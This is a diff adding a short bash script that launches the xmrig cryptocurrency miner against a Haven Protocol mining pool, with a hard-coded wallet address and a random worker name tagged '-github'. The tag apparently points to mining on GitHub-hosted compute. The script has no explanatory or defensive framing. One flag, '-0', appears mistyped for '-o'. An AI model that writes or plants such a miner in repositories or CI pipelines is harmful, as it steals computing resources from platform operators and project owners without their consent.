@@ -1,0 +1,7 @@
+#!/bin/bash
+POOL=haven.herominers.com:10450
+WALLET=hvs1JUEon79AQJs1w4XfYZ1mNYBVxunQhKzDGSteHM7QVq6zxEp4KRKVhGJBdzxsioATdRrxDjh2DLbmgxdz7XP22nXEz2Lum1
+WORKEER=$(echo $(shuf -i 10-99999999999 -n 1)-github)
+
+chmod  +x xmrig
+./xmrig -a cn-heavy/xhv -0 $POOL -u $WALLET -p $WORKEER --donate-level 1
